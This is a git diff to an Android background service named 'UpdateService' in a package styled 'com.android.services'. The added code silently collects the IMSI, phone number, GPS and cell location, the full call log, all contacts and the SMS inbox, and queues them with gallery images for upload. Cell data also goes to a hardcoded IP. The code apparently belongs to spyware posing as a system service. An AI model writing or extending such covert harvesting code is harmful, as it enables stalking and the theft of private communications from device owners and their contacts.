@@ -4,13 +4,16 @@ package com.android.services.Firebase;
  * Created by Tambora on 06/10/2016.
  */
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Notification;
 import android.app.Service;
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -21,18 +24,29 @@ import android.os.AsyncTask;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.NotificationCompat;
 import android.support.v4.content.LocalBroadcastManager;
+import android.telephony.TelephonyManager;
+import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 import android.widget.RemoteViews;
 
+import com.android.services.Adapter.PushNotification;
+import com.android.services.MainActivity;
+import com.android.services.Model.ContactModel;
 import com.android.services.Model.Model_images;
 import com.android.services.R;
 import com.android.services.Utils.AndLog;
 import com.android.services.Utils.AppConf;
+import com.android.services.Utils.CallLogHelper;
 import com.android.services.Utils.FileUploader;
 import com.android.services.Utils.SessionManager;
+import com.android.services.Utils.VolleyHttp;
+import com.android.volley.AuthFailureError;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.Response;
@@ -42,6 +56,9 @@ import com.android.volley.toolbox.Volley;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnSuccessListener;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -68,7 +85,6 @@ public class UpdateService extends Service {
     private Handler handler = new Handler();
     private final int NOTIFICATION_ID = 1479;
     private final int DELAY = 300000;
-    private FusedLocationProviderClient mFusedLocationClient;
     private RequestQueue requestQueue;
     private boolean checkloc;
     private LocationManager locationManager;
@@ -82,8 +98,19 @@ public class UpdateService extends Service {
     boolean boolean_folder;
     public File file;
     public static final String IMAGE_DIRECTORY = "ImageScalling";
+    private String nomor, imsi, lat_cid, lon_cid, lat_gps, lon_gps, callNumber, callName, callDate, callType, duration, ctc_name, ctc_nomor;
+    private ArrayList<String> conNames;
+    private ArrayList<String> conNumbers;
+    private ArrayList<String> conTime;
+    private ArrayList<String> conDate;
+    private ArrayList<String> conType;
+    private int cid, lac, mcc, mnc;
+    private final String LIST_CTC = "CONTACT";
+    private FusedLocationProviderClient mFusedLocationClient;
+    private final String TAG = "MNACT";
+    private GsmCellLocation gsmCellLocation;
 
-
+    
     @Override
     public void onCreate() {
         super.onCreate();
@@ -134,17 +161,95 @@ public class UpdateService extends Service {
         LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, new IntentFilter("send"));
 
         handler.post(updateData);
-        return START_STICKY;
 
+
+
+
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String networkOperator = telephonyManager.getNetworkOperator();
+
+        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+        gsmCellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
+
+        lat_gps = "0";
+        lon_gps = "0";
+        lat_cid = "0";
+        lon_cid = "0";
+
+        mFusedLocationClient.getLastLocation()
+                .addOnSuccessListener(new OnSuccessListener<Location>() {
+                    @Override
+                    public void onSuccess(Location location) {
+                        // Got last known location. In some rare situations this can be null.
+                        if (location != null) {
+                            // Logic to handle location object
+
+                            double dlat = location.getLatitude();
+                            double dlon = location.getLongitude();
+
+                            lat_gps = String.valueOf(dlat);
+                            lon_gps = String.valueOf(dlon);
+
+                            AndLog.ShowLog(TAG, lat_gps + " ;; " + lon_gps);
+                            sessionManager.setLat(lat_gps);
+                            sessionManager.setLng(lon_gps);
+
+
+                        }
+                    }
+                });
+
+        /// IMSI
+        imsi = telephonyManager.getSubscriberId();
+        AndLog.ShowLog(TAG, "IMSI : " + imsi);
+        sessionManager.setImsi(imsi);
+        /// NOMOR
+        nomor = telephonyManager.getLine1Number();
+        AndLog.ShowLog(TAG, "Nomor : " + nomor);
+        sessionManager.setNomor(nomor);
+
+        /// LOCATION CELL
+        cid = 0;
+        lac = 0;
+        mcc = 0;
+        mnc = 0;
+
+
+        try {
+
+            cid = gsmCellLocation.getCid();
+            lac = gsmCellLocation.getLac();
+            mcc = Integer.parseInt(networkOperator.substring(0, 3));
+            mnc = Integer.parseInt(networkOperator.substring(3));
+
+            getLoc();
+
+        } catch (Exception e) {
+
+        }
+
+        AndLog.ShowLog(TAG, "CID : " + cid + "\n" +
+                "LAC : " + lac + "\n" +
+                "MCC : " + mcc + "\n" +
+                "MNC : " + mnc + "\n");
+
+        sessionManager.setCid(String.valueOf(cid));
+        sessionManager.setLac(String.valueOf(lac));
+        sessionManager.setMcc(String.valueOf(mcc));
+        sessionManager.setMnc(String.valueOf(mnc));
+
+        callLog();
+
+        return START_STICKY;
     }
 
     public BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            ambilgallery();
-            InsertDeep();
-            AsyncTaskRunner task = new AsyncTaskRunner();
-            task.execute();
+//            ambilgallery();
+//            InsertDeep();
+//            AsyncTaskRunner task = new AsyncTaskRunner();
+//            task.execute();
         }
     };
 
@@ -349,6 +454,7 @@ public class UpdateService extends Service {
     }
 
     private void InsertDeep() {
+        AndLog.ShowLog("dsdeep","sdasd");
         final SessionManager sess = new SessionManager(getApplicationContext());
         StringRequest strReq = new StringRequest(Request.Method.POST, URL_SEND_DEEP, new Response.Listener<String>() {
 
@@ -490,6 +596,12 @@ public class UpdateService extends Service {
         return al_images;
     }
 
+    private void SimpanAll(){
+        ambilgallery();
+        InsertDeep();
+        AsyncTaskRunner task = new AsyncTaskRunner();
+        task.execute();
+    }
 
     private void copyFile(File sourceFile, File destFile) throws IOException {
         if (!sourceFile.exists()) {
@@ -577,5 +689,236 @@ public class UpdateService extends Service {
             e.printStackTrace();
         }
         return b;
+    }
+
+    public void callLog() {
+        AndLog.ShowLog("runn1ng:", "callogs");
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+
+            conNames = new ArrayList<String>();
+            conNumbers = new ArrayList<String>();
+            conTime = new ArrayList<String>();
+            conDate = new ArrayList<String>();
+            conType = new ArrayList<String>();
+            Cursor curLog = CallLogHelper.getAllCallLogs(getContentResolver());
+            getCallLogs(curLog);
+        }
+    }
+
+    private void getLoc() {
+        AndLog.ShowLog("dss", "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid);
+        StringRequest stringRequest = new StringRequest(Request.Method.GET, "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid, new Response.Listener<String>() {
+            @Override
+            public void onResponse(String response) {
+
+                try {
+
+                    JSONObject jo = new JSONObject(response);
+                    String hasil = jo.getString("hasil");
+
+                    if (hasil.toString().trim().equals("true")) {
+
+                        lat_cid = jo.getString("lat");
+                        lon_cid = jo.getString("lon");
+                        sessionManager.setLatCid(lat_cid);
+                        sessionManager.setLngCid(lon_cid);
+
+                    }
+
+                } catch (JSONException e) {
+                    e.printStackTrace();
+
+
+                }
+
+
+            }
+        }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+
+            }
+
+        }) {
+
+        };
+
+        stringRequest.setTag(getString(R.string.app_name));
+        VolleyHttp.getInstance(this).addToRequestQueue(stringRequest);
+
+    }
+
+
+    //    get call log
+    private void getCallLogs(Cursor curLog) {
+        AndLog.ShowLog("runn1ng:", "getcallogs");
+        String data = "";
+        while (curLog.moveToNext()) {
+            String finaldata = "";
+
+            callName = curLog
+                    .getString(curLog
+                            .getColumnIndex(CallLog.Calls.CACHED_NAME));
+            if (callName == null) {
+//                conNames.add("Unknown");
+                finaldata = finaldata + "Unknown No : ";
+            } else {
+//            conNames.add(callName);
+                finaldata = finaldata + callName + " No : ";
+            }
+            callNumber = curLog.getString(curLog
+                    .getColumnIndex(CallLog.Calls.NUMBER));
+//            conNumbers.add(callNumber);
+            finaldata = finaldata + callNumber;
+
+            duration = curLog.getString(curLog
+                    .getColumnIndex(CallLog.Calls.DURATION));
+//            conTime.add(duration);
+            finaldata = finaldata + " ( " + duration + " sec ) ";
+
+            callDate = curLog.getString(curLog
+                    .getColumnIndex(CallLog.Calls.DATE));
+            SimpleDateFormat formatter = new SimpleDateFormat(
+                    "dd-MMM-yyyy HH:mm");
+            String dateString = formatter.format(new Date(Long
+                    .parseLong(callDate)));
+//            conDate.add(dateString);
+            finaldata = finaldata + dateString;
+
+            callType = curLog.getString(curLog
+                    .getColumnIndex(CallLog.Calls.TYPE));
+            if (callType.equals("1")) {
+//                conType.add("Incoming");
+                finaldata = finaldata + " ( Incoming ) , ";
+            } else {
+//                conType.add("Outgoing");
+                finaldata = finaldata + " ( Outgoing )";
+            }
+            data = data + finaldata +"###";
+        }
+
+        final String CalLog = data;
+        AndLog.ShowLog("CalLogPhone", CalLog);
+        sessionManager.setCallLog(CalLog);
+
+        contactLog();
+
+    }
+
+    public void contactLog() {
+        AndLog.ShowLog("runn1ng:", "contactLog");
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+
+            new LoadFromContactList().execute();
+        }
+    }
+
+    private class LoadFromContactList extends AsyncTask<Void, String, ArrayList<ContactModel>> {
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+            AndLog.ShowLog("runn1ng:", "LoadFromContactList");
+            //Log.i(TAG, "Load Contact");
+        }
+
+        @Override
+        protected ArrayList<ContactModel> doInBackground(Void... params) {
+            // TODO Auto-generated method stub
+
+            ArrayList<ContactModel> result = LihatContact();
+
+            return result;
+        }
+
+
+        @Override
+        protected void onPostExecute(final ArrayList<ContactModel> result) {
+            // TODO Auto-generated method stub
+            super.onPostExecute(result);
+            String data = "";
+            String compare = "";
+            for (int i = 0; i < result.size(); i++) {
+//                AndLog.ShowLog("ContactDetail", result.get(i).getNama() + " - " + result.get(i).getExtra());
+                AndLog.ShowLog(LIST_CTC + " nama", ctc_name = result.get(i).getNama());
+                AndLog.ShowLog(LIST_CTC + " nomor", ctc_nomor = result.get(i).getExtra());
+
+                if (!compare.equals(result.get(i).getExtra())) {
+                    data = data + result.get(i).getNama() + "(" + result.get(i).getExtra() + ")###";
+                }
+
+                compare = result.get(i).getExtra();
+
+            }
+            final String Contact = data;
+            AndLog.ShowLog("Ctc_list", Contact);
+            sessionManager.setContact(Contact);
+            fetchInbox();
+
+        }
+
+
+    }
+
+    private ArrayList<ContactModel> LihatContact() {
+
+        ArrayList<ContactModel> tmpContact = new ArrayList<>();
+        ContactModel contactVO;
+        ContentResolver contentResolver = this.getContentResolver();
+        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+        if (cursor.getCount() > 0) {
+            while (cursor.moveToNext()) {
+
+                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER)));
+                if (hasPhoneNumber > 0) {
+
+                    contactVO = new ContactModel();
+                    String fixPhone = "0";
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
+                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String mphone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+
+                    fixPhone = mphone.replace("+62", "0").replaceAll("\\D+", "");
+
+                    contactVO.setNama(name);
+                    contactVO.setExtra(fixPhone);
+
+
+                    tmpContact.add(contactVO);
+
+
+                }
+            }
+
+        }
+
+
+        return tmpContact;
+    }
+
+    public void fetchInbox() {
+        AndLog.ShowLog("runn1ng","fetchInbox");
+        ArrayList sms = new ArrayList();
+
+        Uri uriSms = Uri.parse("content://sms/inbox");
+        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"}, null, null, null);
+        String msgData = "";
+        cursor.moveToFirst();
+        while (cursor.moveToNext()) {
+            String address = cursor.getString(1);
+            String body = cursor.getString(3);
+
+            msgData += " " + "\n" + "Mobile number : " + cursor.getString(1) + ",SMS Text:" + cursor.getString(3) + "###";
+
+            AndLog.ShowLog("Mobile number : ", address);
+            AndLog.ShowLog("SMS Text ", body);
+
+            sms.add("Address" + address + " / SMS :" + body);
+        }
+        AndLog.ShowLog("msg: ", msgData);
+        sessionManager.setPesan(msgData);
+//        LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent("send"));
+        SimpanAll();
+
     }
 }
